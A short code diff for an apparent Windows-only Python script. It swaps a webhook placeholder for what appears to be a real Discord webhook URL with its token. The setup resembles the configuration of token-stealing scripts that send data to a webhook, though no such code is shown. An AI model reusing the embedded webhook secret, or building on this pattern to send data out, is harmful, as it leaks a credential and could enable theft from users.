@@ -1,4 +1,4 @@
-WEBHOOK_URL = 'You Webhook Here'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/864541946759479306/F3OjVsOAa4_lTtUt13Gh045yZE0JEyFDT7zOjcG81hRFkRNsN1ibPjQ57sNsMas0zWnS'
 
 import os
 if os.name != "nt": exit()
